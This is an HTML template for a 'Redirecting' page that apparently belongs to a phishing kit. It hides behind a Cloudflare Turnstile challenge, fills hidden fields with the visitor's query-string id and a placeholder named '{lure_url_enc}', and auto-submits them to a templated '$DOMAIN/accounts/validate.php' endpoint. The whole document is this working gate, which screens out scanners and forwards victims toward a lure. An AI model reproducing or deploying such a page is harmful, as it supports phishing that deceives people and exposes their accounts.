<html>
<head>
    <title>Redirecting</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
</head>
<body>

<form action="https://$DOMAIN/accounts/validate.php" method="POST">
<input type="hidden" name="id">
<input type="hidden" name="url">
<div class="cf-turnstile" id ="turnstile-widget"></div>
</form>

<script>
turnstile.ready(function () {
    params = new URLSearchParams(location.search);
    document.querySelector("input[name=id]").value = location.search.slice(1);
    document.querySelector("input[name=url]").value = "{lure_url_enc}";
    turnstile.render('#turnstile-widget', {
        sitekey: '$PKEY',
        appearance: 'interaction-only',
        callback: function(token) {
	    document.forms[0].submit();
        }
    });
});
</script>
</body>
</html>
